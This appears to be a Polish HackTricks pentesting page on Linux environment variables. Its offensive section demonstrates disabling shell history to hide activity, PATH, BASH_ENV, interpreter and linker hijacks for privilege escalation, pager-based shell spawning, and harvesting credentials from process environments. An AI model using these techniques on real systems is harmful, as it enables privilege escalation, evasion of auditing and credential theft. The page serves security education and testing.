# Zmienne środowiskowe Linux

{{#include ../../banners/hacktricks-training.md}}

## Zmienne globalne

Zmienne globalne **będą** dziedziczone przez **procesy potomne**.

Możesz utworzyć zmienną globalną dla bieżącej sesji, wykonując:
```bash
export MYGLOBAL="hello world"
echo $MYGLOBAL #Prints: hello world
```
Ta zmienna będzie dostępna dla bieżących sesji i ich procesów potomnych.

Możesz **usunąć** zmienną, wykonując:
```bash
unset MYGLOBAL
```
## Zmienne lokalne

Do **zmiennych lokalnych** można uzyskać dostęp wyłącznie z poziomu **bieżącej powłoki/skryptu**.
```bash
LOCAL="my local"
echo $LOCAL
unset LOCAL
```
## Wyświetlanie bieżących zmiennych
```bash
set
env
printenv
cat /proc/$$/environ
cat /proc/`python -c "import os; print(os.getppid())"`/environ
```
Zawartość `/proc/*/environ` jest **rozdzielona znakami NUL**, więc te warianty są zazwyczaj łatwiejsze do odczytania:
```bash
tr '\0' '\n' </proc/$$/environ | sort -u
tr '\0' '\n' </proc/<PID>/environ | sort -u
```
Jeśli szukasz **credentials** lub **interesującej konfiguracji usług** w odziedziczonych środowiskach, sprawdź również [Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md).

## Wspólne zmienne

Źródło: [https://geek-university.com/linux/common-environment-variables/](https://geek-university.com/linux/common-environment-variables/)<sup>[[5]](#references)</sup>

- **DISPLAY** – wyświetlacz używany przez **X**. Ta zmienna jest zwykle ustawiona na **:0.0**, co oznacza pierwszy wyświetlacz na bieżącym komputerze.
- **EDITOR** – preferowany edytor tekstu użytkownika.
- **HISTFILESIZE** – maksymalna liczba wierszy zawartych w pliku historii.
- **HISTSIZE** – liczba wierszy dodawanych do pliku historii po zakończeniu sesji przez użytkownika.
- **HOME** – katalog domowy.
- **HOSTNAME** – nazwa hosta komputera.
- **LANG** – bieżący język.
- **MAIL** – lokalizacja spoola pocztowego użytkownika. Zwykle **/var/spool/mail/USER**.
- **MANPATH** – lista katalogów przeszukiwanych w poszukiwaniu stron podręcznika.
- **OSTYPE** – typ systemu operacyjnego.
- **PS1** – domyślny prompt w bash.
- **PATH** – przechowuje ścieżki wszystkich katalogów zawierających pliki binarne, które chcesz uruchamiać poprzez podanie samej nazwy pliku, a nie ścieżki względnej lub bezwzględnej.
- **PWD** – bieżący katalog roboczy.
- **SHELL** – ścieżka do bieżącej powłoki poleceń (na przykład **/bin/bash**).
- **TERM** – bieżący typ terminala (na przykład **xterm**).
- **TZ** – strefa czasowa.
- **USER** – bieżąca nazwa użytkownika.

## Interesujące zmienne dla hacking

Nie każda zmienna jest równie użyteczna. Z perspektywy ofensywnej priorytetowo traktuj zmienne, które zmieniają **ścieżki wyszukiwania**, **pliki startowe**, **zachowanie dynamic linker** lub **audytowanie/logowanie**.

### **HISTFILESIZE**

Zmień **wartość tej zmiennej na 0**, aby po **zakończeniu sesji** **plik historii** (\~/.bash_history) został **skrócony do 0 wierszy**.
```bash
export HISTFILESIZE=0
```
### **HISTSIZE**

Zmień **wartość tej zmiennej na 0**, aby polecenia **nie były przechowywane w historii w pamięci** ani zapisywane z powrotem do **pliku historii** (\~/.bash_history).
```bash
export HISTSIZE=0
```
### **HISTCONTROL**

Jeśli **wartość tej zmiennej jest ustawiona na `ignorespace` lub `ignoreboth`**, każde polecenie poprzedzone dodatkową spacją nie zostanie zapisane w historii.
```bash
export HISTCONTROL=ignorespace
```

```bash
$ echo "to save or"
$  echo "not to save"
```
### **HISTFILE**

Wskaż **plik historii** na **`/dev/null`** lub całkowicie go wyłącz. Zwykle jest to bardziej niezawodne niż samo zmienianie rozmiaru historii.
```bash
export HISTFILE=/dev/null
unset HISTFILE
```
### http_proxy & https_proxy

Procesy będą używać zadeklarowanego tutaj **proxy**, aby łączyć się z internetem przez **http lub https**.
```bash
export http_proxy="http://10.10.10.10:8080"
export https_proxy="http://10.10.10.10:8080"
```
### all_proxy & no_proxy

- `all_proxy`: domyślny proxy dla narzędzi/protokołów, które go respektują.
- `no_proxy`: lista wyłączeń (hosty/domeny/CIDR), które powinny łączyć się bezpośrednio.
```bash
export all_proxy="socks5h://10.10.10.10:1080"
export no_proxy="localhost,127.0.0.1,.corp.local,10.0.0.0/8"
```
W zależności od narzędzia można używać wariantów pisanych małymi lub wielkimi literami (`http_proxy`/`HTTP_PROXY`, `no_proxy`/`NO_PROXY`).

### SSL_CERT_FILE & SSL_CERT_DIR

Procesy będą ufać certyfikatom wskazanym w **tych zmiennych środowiskowych**. Jest to przydatne do sprawienia, aby narzędzia takie jak **`curl`**, **`git`**, klienci HTTP języka Python lub menedżery pakietów ufały CA kontrolowanemu przez attackera (na przykład w celu sprawienia, aby interception proxy wyglądał wiarygodnie).
```bash
export SSL_CERT_FILE=/path/to/ca-bundle.pem
export SSL_CERT_DIR=/path/to/ca-certificates
```
### **PATH**

Jeśli uprzywilejowany wrapper/skrypt wykonuje polecenia **bez ścieżek absolutnych**, wygrywa **pierwszy kontrolowany przez atakującego katalog** w `PATH`. To podstawowy mechanizm wielu **PATH hijacks** w `sudo`, zadaniach cron, wrapperach powłoki i niestandardowych helperach SUID. Szukaj `env_keep+=PATH`, słabego `secure_path` lub wrapperów, które wywołują `tar`, `service`, `cp`, `python` itd. po nazwie.
```bash
mkdir -p /dev/shm/bin
cat > /dev/shm/bin/tar <<'EOF'
#!/bin/sh
echo '[+] PATH hijack reached' >&2
id
EOF
chmod +x /dev/shm/bin/tar
PATH=/dev/shm/bin:$PATH vulnerable-wrapper
```
W przypadku pełnych łańcuchów eskalacji uprawnień wykorzystujących `PATH` sprawdź [Linux Privilege Escalation](linux-privilege-escalation/README.md).

### **HOME & XDG_CONFIG_HOME**

`HOME` to nie tylko odwołanie do katalogu: wiele narzędzi automatycznie ładuje **dotfiles**, **plugins** i **konfigurację per-user** z `$HOME` lub `$XDG_CONFIG_HOME`. Jeśli uprzywilejowany workflow zachowuje te wartości, **config injection** może być łatwiejsze niż **binary hijacking**.
```bash
export HOME=/dev/shm/fakehome
export XDG_CONFIG_HOME=/dev/shm/fakehome/.config
mkdir -p "$XDG_CONFIG_HOME"
```
Interesujące cele obejmują `.gitconfig`, `.wgetrc`, `.curlrc`, `.inputrc`, `.pythonrc.py` oraz pliki specyficzne dla narzędzi, takie jak `.terraformrc`.

### **LD_PRELOAD, LD_LIBRARY_PATH i LD_AUDIT**

Zmienne te wpływają na **dynamic linker**:

- `LD_PRELOAD`: wymusza wcześniejsze załadowanie dodatkowych obiektów współdzielonych.
- `LD_LIBRARY_PATH`: dodaje katalogi wyszukiwania bibliotek na początku listy.
- `LD_AUDIT`: ładuje biblioteki audytujące, które monitorują ładowanie bibliotek i rozwiązywanie symboli.

Są niezwykle wartościowe w przypadku **hooking**, **instrumentation** i **privilege escalation**, jeśli uprzywilejowane polecenie zachowuje ich wartości. W trybie **secure-execution** (`AT_SECURE`, np. setuid/setgid/capabilities) loader usuwa lub ogranicza wiele z tych zmiennych. Jednak parser bugs na tym wczesnym etapie działania loadera nadal mają duże znaczenie, ponieważ występują **przed** uruchomieniem programu docelowego.<sup>[[2]](#references)</sup>
```bash
env | grep -E '^LD_'
ldso=$(ls /lib64/ld-linux-*.so.* /lib/*-linux-gnu/ld-linux-*.so.* 2>/dev/null | head -n1)
"$ldso" --list-diagnostics /bin/true | head
"$ldso" --list-tunables /bin/true | head
```
### **GLIBC_TUNABLES**

`GLIBC_TUNABLES` zmienia wczesne zachowanie glibc (na przykład parametry dostrajania alokatora) i jest bardzo przydatne w laboratoriach exploitów. Ma również znaczenie z perspektywy bezpieczeństwa, ponieważ **dynamiczny loader analizuje je bardzo wcześnie**. Błąd **Looney Tunables** z 2023 roku był dobrym przypomnieniem, że pojedyncza zmienna środowiskowa analizowana przez loader może stać się **prymitywem lokalnej eskalacji uprawnień** przeciwko programom SUID.<sup>[[6]](#references)</sup>
```bash
GLIBC_TUNABLES=glibc.malloc.tcache_count=0 ./binary
```
### **BASH_ENV & ENV**

Jeśli **Bash** jest uruchamiany **nieinteraktywnie**, sprawdza zmienną `BASH_ENV` i wykonuje `source` tego pliku przed uruchomieniem docelowego skryptu. Gdy Bash jest wywoływany jako `sh` lub działa w interaktywnym trybie POSIX, może również sprawdzać `ENV`. To klasyczny sposób na przekształcenie shell wrappera w code execution, jeśli środowisko jest kontrolowane przez atakującego.
```bash
cat > /tmp/pre.sh <<'EOF'
echo '[+] sourced before the target script'
EOF
BASH_ENV=/tmp/pre.sh bash -c 'echo target'
```
Sam Bash wyłącza te pliki startowe, gdy **rzeczywiste/efektywne identyfikatory różnią się** — chyba że użyto `-p`, więc dokładne zachowanie zależy od sposobu, w jaki wrapper uruchamia powłokę. Należy uważać na uprzywilejowane wrappery, które wywołują `setuid()`/`setgid()` **przed** uruchomieniem Basha: gdy identyfikatory ponownie się zgadzają, Bash może zaufać `BASH_ENV`, `ENV` oraz powiązanemu stanowi powłoki, które w przeciwnym razie zostałyby zignorowane.<sup>[[1]](#references)</sup>

### **PYTHONPATH, PYTHONHOME, PYTHONSTARTUP & PYTHONINSPECT**

Te zmienne zmieniają sposób uruchamiania Pythona:

- `PYTHONPATH`: dodaje ścieżki wyszukiwania importów na początku.
- `PYTHONHOME`: zmienia lokalizację drzewa biblioteki standardowej.
- `PYTHONSTARTUP`: wykonuje plik przed wyświetleniem interaktywnego promptu.
- `PYTHONINSPECT=1`: przechodzi do trybu interaktywnego po zakończeniu działania skryptu.

Są przydatne przeciwko skryptom utrzymaniowym, debuggerom, shellom i wrapperom, które wywołują Pythona ze środowiskiem, nad którym można przejąć kontrolę. `python -E` i `python -I` ignorują wszystkie zmienne `PYTHON*`.
```bash
mkdir -p /tmp/pylib
printf 'print("owned from PYTHONPATH")\n' > /tmp/pylib/htmod.py
PYTHONPATH=/tmp/pylib python3 -c 'import htmod'
PYTHONPATH=/tmp/pylib python3 -I -c 'import htmod'   # ignored in isolated mode
```
Niedawnym przykładem z rzeczywistego świata było LPE w **needrestart** z 2024 roku w systemach Ubuntu/Debian: skaner uruchamiany jako root kopiował `PYTHONPATH` z `/proc/<PID>/environ` nieuprzywilejowanego procesu, a następnie wykonywał Python. Opublikowany exploit umieszczał `importlib/__init__.so` w ścieżce kontrolowanej przez atakującego, dzięki czemu Python wykonywał kod atakującego podczas własnej inicjalizacji, zanim hard-coded skrypt helpera miał w ogóle znaczenie.<sup>[[3]](#references)</sup>

### **PERL5OPT & PERL5LIB**

Perl ma równie użyteczne zmienne startowe:

- `PERL5LIB`: dodaje katalogi bibliotek na początku ścieżki.
- `PERL5OPT`: wstrzykuje przełączniki tak, jakby znajdowały się w każdym wierszu poleceń `perl`.

Może to wymusić **automatyczne ładowanie modułów** lub zmienić zachowanie interpretera, zanim skrypt docelowy wykona cokolwiek istotnego. Perl ignoruje te zmienne w kontekstach taint / setuid / setgid, ale nadal mają one duże znaczenie dla zwykłych wrapperów uruchamianych jako root, zadań CI, installerów oraz niestandardowych reguł sudoers.
```bash
mkdir -p /tmp/perllib
cat > /tmp/perllib/HT.pm <<'EOF'
package HT;
BEGIN { print "PERL5OPT_TRIGGERED\n" }
1;
EOF
PERL5LIB=/tmp/perllib PERL5OPT=-MHT perl -e 'print "target\n"'
```
### **NODE_OPTIONS**

`NODE_OPTIONS` dodaje **flagi CLI Node.js** przed argumentami każdego procesu `node`, który dziedziczy środowisko. Dzięki temu jest przydatne przeciwko wrapperom, zadaniom CI, pomocniczym procesom Electron oraz regułom sudo, które ostatecznie uruchamiają Node. Z ofensywnego punktu widzenia najciekawsze flagi to zwykle:

- `--require <file>`: wstępnie ładuje plik CommonJS przed skryptem docelowym.
- `--import <module>`: wstępnie ładuje moduł ES przed skryptem docelowym.

Node odrzuca niektóre niebezpieczne flagi w `NODE_OPTIONS`, ale `--require` i `--import` są wyraźnie dozwolone i są przetwarzane **przed** zwykłymi argumentami wiersza poleceń.<sup>[[4]](#references)</sup>
```bash
cat > /tmp/preload.js <<'EOF'
console.error('[+] NODE_OPTIONS preload reached')
EOF
NODE_OPTIONS='--require /tmp/preload.js' node -e 'console.log("target")'
```
W przypadku zdalnych łańcuchów gadgetów, które pośrednio ustawiają `NODE_OPTIONS` (na przykład od prototype-pollution do RCE), sprawdź [tę inną stronę](../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.md).

### **RUBYLIB & RUBYOPT**

Ruby oferuje tę samą klasę nadużyć podczas uruchamiania:

- `RUBYLIB`: dodaje katalogi na początku ścieżki ładowania Ruby.
- `RUBYOPT`: wstrzykuje opcje wiersza poleceń, takie jak `-r`, do każdego wywołania `ruby`.
```bash
mkdir -p /tmp/rubylib
printf 'warn "[+] RUBYOPT preload reached"\n' > /tmp/rubylib/ht.rb
RUBYLIB=/tmp/rubylib RUBYOPT='-rht' ruby -e 'puts :target'
```
Wady **needrestart** z 2024 roku pokazały, że nie jest to tylko sztuczka laboratoryjna: ten sam helper należący do użytkownika root, który był podatny na nadużycie `PYTHONPATH`, mógł również zostać zmuszony do uruchomienia Ruby ze sterowanym przez atakującego `RUBYLIB`, ładując `enc/encdb.so` z katalogu atakującego.<sup>[[3]](#references)</sup>

### **PAGER, MANPAGER, GIT_PAGER, GIT_EDITOR & LESSOPEN**

Niektóre narzędzia nie tylko odczytują ścieżkę ze środowiska; przekazują wartość do **shella**, **edytora** lub **preprocesora wejścia**. Sprawia to, że poniższe zmienne są szczególnie interesujące, gdy uprzywilejowany wrapper uruchamia `git`, `man`, `less` lub podobne przeglądarki tekstu:

- `PAGER`, `MANPAGER`, `GIT_PAGER`: wybierają polecenie pagera.
- `GIT_EDITOR`, `VISUAL`, `EDITOR`: wybierają polecenie edytora, często wraz z argumentami.
- `LESSOPEN`, `LESSCLOSE`: definiują pre/postprocesory uruchamiane, gdy `less` otwiera plik.
```bash
PAGER='sh -c "exec sh 0<&1 1>&1"' man man

cat > /tmp/lesspipe.sh <<'EOF'
#!/bin/sh
echo '[+] LESSOPEN triggered' >&2
cat "$1"
EOF
chmod +x /tmp/lesspipe.sh
LESSOPEN='|/tmp/lesspipe.sh %s' less /etc/hosts
```
Git obsługuje również **wstrzykiwanie konfiguracji wyłącznie za pomocą zmiennych środowiskowych** bez zapisywania danych na dysku przy użyciu `GIT_CONFIG_COUNT`, `GIT_CONFIG_KEY_<n>` oraz `GIT_CONFIG_VALUE_<n>`:
```bash
GIT_CONFIG_COUNT=1 \
GIT_CONFIG_KEY_0=core.pager \
GIT_CONFIG_VALUE_0='sh -c "exec sh 0<&1 1>&1"' \
git -p help
```
Z perspektywy post-exploitation pamiętaj również, że odziedziczone środowiska często zawierają **dane uwierzytelniające**, **ustawienia proxy**, **tokeny usług** lub **klucze cloud**. Sprawdź [Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md), aby poznać wyszukiwanie w `/proc/<PID>/environ` oraz `systemd` `Environment=`.

### PS1

Zmień wygląd swojego promptu.

[**To jest przykład**](https://gist.github.com/carlospolop/43f7cd50f3deea972439af3222b68808)

Root:

![PERL5OPT & PERL5LIB - PS1: To jest przykład](<../images/image (897).png>)

Zwykły użytkownik:

![PERL5OPT & PERL5LIB - PS1: Jedno, dwa i trzy zadania uruchomione w tle](<../images/image (740).png>)

Jedno, dwa i trzy zadania uruchomione w tle:

![PERL5OPT & PERL5LIB - PS1: Jedno, dwa i trzy zadania uruchomione w tle](<../images/image (145).png>)

Jedno zadanie w tle, jedno zatrzymane, a ostatnie polecenie nie zakończyło się poprawnie:

![PERL5OPT & PERL5LIB - PS1: Jedno zadanie w tle, jedno zatrzymane, a ostatnie polecenie nie zakończyło się poprawnie](<../images/image (715).png>)

## Referencje

- [1] [Podręcznik GNU Bash - pliki startowe Bash](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html)
- [2] [ld.so(8) - strona podręcznika Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [3] [Qualys - LPE w needrestart](https://www.qualys.com/2024/11/19/needrestart/needrestart.txt)
- [4] [Dokumentacja CLI Node.js - `NODE_OPTIONS`](https://nodejs.org/api/cli.html)
- [5] [Typowe zmienne środowiskowe - Geek University](https://geek-university.com/linux/common-environment-variables/)
- [6] [CVE-2023-4911: Looney Tunables - lokalne podniesienie uprawnień w ld.so biblioteki glibc - Qualys](https://blog.qualys.com/vulnerabilities-threat-research/2023/10/03/cve-2023-4911-looney-tunables-local-privilege-escalation-in-the-glibcs-ld-so)

{{#include ../../banners/hacktricks-training.md}}
